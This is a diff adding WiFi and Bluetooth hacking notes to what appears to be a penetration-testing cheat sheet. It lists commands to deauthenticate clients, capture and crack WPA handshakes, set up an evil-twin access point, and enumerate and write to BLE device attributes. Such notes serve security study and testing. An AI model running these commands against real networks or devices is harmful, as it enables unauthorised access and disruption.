@@ -183,5 +183,61 @@ readelf -l <file> | grep GNU_STACK
     * You can write a word or half word at a time because the address could be large
 * Heap Exploit
   * For unlink heap overflow, use negative values for the size so the addresses are used within the mem chunk and not the previous chunk
+## Wifi Hacking
+* wifite2 - tools that provides a menu and automates wifi hacking
+```
+wifite
+```
+* airgeddon - tools that prrovide a menu that automates wifi hacking. Has reaver, WPS pixie-dust
+  * Create evil twin AP that has the same name as target AP but no password
+```
+git clone github.com/v1s1t0r1sh3r3/airgeddon.git
+cd airgeddon
+sudo bash ./airgeddon.sh
+```
+* airgraph-ng - collect devices and names connected to different APs
+```
+airodump-ng <wlan-monitor-mode> -w <capture_file_name>
+# Graph of connected devices
+airgraph-ng -o <output_image>.png -i <captured_file_name>.csv -g CAPR
+# Graph of disconnected devices
+airgraph-ng -o <output_image>.png -i <captured_file_name>.csv -g CPG
+```
+* Manual wifi commands
+```
+# Put wifi in monitor mode
+airmon-ng start wlan0
+# List available APs and channels
+airodump-ng <wlan-monitor-mode>
+# Capture traffic on one AP and channel
+airodump-ng --bssid <BSSID> -c <channel> --write <output_file_name> <wlan-monitor-mode>
+# In another window, deauth the target
+aireplay-ng --deauth 100 -a <BSSID> <wlan-monitor-mode>
+# Wait for the handshake to be capture, airodump-ng says "WP handshake" in the far right top line
+# Crack the password
+aircrack-ng <output_file> -w <wordlist>
+```
+## Bluetooth Hacking
+* bettercap
+  * There's issues were it will only do ble.show one time and then you have to exit bettercap and restart it
+  * The MAC addresses of iPhones will rotate
+```
+# Install
+apt install golang
+go get github.com/bettercap/bettercap
+cd $GOPATH/src/github.com/bettercap/bettercap
+make build
+sudo make install
+# Start
+sudo bettercap
+# Bluetooth sniffing
+bettercap>> ble.recon on
+# Enumerate devices
+bettercap>> ble.show
+# Scan device
+bettercap>> ble.enum <MAC>
+# There should be some write attributes and we can write to it
+bettercap>> ble.write <MAC> <attr_id> <value>
+```
 ## Resources
 * Tips tools and guides in https://github.com/swisskyrepo/PayloadsAllTheThings
